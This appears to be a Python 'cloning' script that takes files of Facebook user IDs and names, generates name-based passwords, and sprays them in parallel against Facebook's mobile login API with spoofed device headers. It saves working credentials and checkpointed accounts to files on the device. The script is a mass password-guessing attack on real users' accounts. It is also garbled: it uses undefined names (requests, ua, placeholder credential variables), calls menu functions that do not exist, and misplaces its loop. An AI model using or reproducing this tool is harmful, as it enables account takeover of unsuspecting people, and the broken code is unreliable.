""" Source by Tamim Ahmed >> MR-GREEN"""
#---------------------------| IMPORT |---------------------------#
import os,zlib,time,random,uuid,subprocess,sys,json,base64,platform,string,marshal,re
from concurrent.futures import ThreadPoolExecutor as swagx
from zlib import decompress
from os import system
from random import randint
#---------------------------| LOOP |---------------------------#
loop,lim = 0,0;methods,pcp,oks,cps,pw,user = [],[],[],[],[],[]
#---------------------------| COLOUR |---------------------------#
white = '\x1b[1;97m';green = '\x1b[38;5;48m';ping = '\x1b[38;5;205m'
#---------------------------| LINEX |---------------------------#
def clear():os.system('clear');print(logo)
def linex():print(f'{white}───────────────────────────────────────────────')
#---------------------------| LOGO |---------------------------#
logo=(f'''
     {white} _______ _  _  _ _______  ______
     {white} |______ |  |  | |_____| |  ____
     {white} ______| |__|__| |     | |_____| 0|0
{white}──────────────────────────────────────────────
        {white}>> Author : Habib Hossain <<
        {white}>> Tools  : File X Random <<
        {white}>> Status : Premium <<
{white}──────────────────────────────────────────────''')
#---------------------------| MENUX |---------------------------#
def _____menux_____():
	clear()
	print(f"{white}|1| File Cloning {white}|3| Random Cloning ")
	print(f"{white}|2| Old Cloning  {white}|0| Exit Cloning ");linex()
	option=input(f"{white}|?| Choice >> ")
	if option in ["1"]:_____File_____()
	if option in ["2"]:_____Randm_____()
	if option in ["3"]:_____old_____()
	else:exit()
#---------------------------| FILE |---------------------------#
def _____File_____():
	clear()
	print(f"{white}|●| Example >> /sdcard/filename.txt ");linex()
	file=input(f"{white}|?| Choice  >> ")
	try:
		fo = open(file,'r').read().splitlines()
	except FileNotFoundError:
		print(f"{white}|●| File Location Not Found ");time.sleep(1);exit()
	clear();print(f"{white}|1| Method >>M1<< ");print(f"{white}|2| Method >>M2<< ");print(f"{white}|3| Method >>M3<< ");print(f"{white}|4| Method >>M4<< ");linex()
	mthd=input(f"{white}|?| Choice >> ")
	plist = []
	clear()
	print(f"      {white}>> Auto Password only Bd Working <<");linex()
	print(f"{white}|1| Auto Password ")
	print(f"{white}|2| Choice Password ");linex()
	pas=input(f"{white}|?| Choice >> ")
	if pas in ['1']:plist.append('first last');plist.append('firstlast');plist.append('first123')
	else:
		try:
			clear()
			ps_limit = int(input(f'{white}|●| Password Limit >> '))
		except:
			ps_limit =1
		clear()
		print(f"{white}|●| Example >> firstlast/first12/first123 ");linex()
		for i in range(ps_limit):
			plist.append(input(f'{white}|●| Enter Password {i+1} >> '))
	clear()
	print(f"{white}|●| Cp Id Show |y|n| ");linex()
	cpx=input(f"{white}|?| Choice >> ")
	if cpx in ['1']:pcp.append('y')
	else:pcp.append('n')
	with swagx(max_workers=30) as habibx:
		clear();tl = str(len(fo))
		print(f"            {white}>> Uid :{green} {tl} {white}<<");linex()
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			if mthd in ['1']:habibx.submit(___M1___,ids,names,passlist)
			elif mthd in ['2']:habibx.submit(___M2___,ids,names,passlist)
			elif mthd in ['3']:habibx.submit(___M3___,ids,names,passlist)
			elif mthd in ['4']:habibx.submit(___M4___,ids,names,passlist)
	print("");linex();print(f"{white}|●| Cloning Complete ");print(f'{white}|●| Total Ok >> '+str(len(oks)));print(f'{white}|●| Total Cp >> '+str(len(cps)));linex();exit()

def ___M1___(ids,names,passlist):
	try:
		global oks,loop
		sys.stdout.write('\r\r\033[1;37m [Juttbrand] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
			ln = fn
			for pw in passlist:
				pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
				with requests.Session() as session:
					data = {"adid": str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"device_based_login","email":___Main_Uid___, "password":___Main_Pass___,"access_token":"350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login", "fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
					headers={"User-Agent":ua,"Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(20000,40000)),"X-FB-SIM-HNI":str(random.randint(20000,40000)),"X-FB-Connection-Type":"MOBILE.LTE","X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":str(random.randint(2000,6000)),"X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
				url = 'https://api.facebook.com/auth/login'
				po = requests.post(url,data=data,headers=headers).json()
				if 'session_key' in po:
					print('\r\r\033[1;32m [JXB-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/JXB-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in po['error']['message']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;208m [JXB-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/JXB-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						continue
				loop+=1
		except:
			pass
_____menux_____()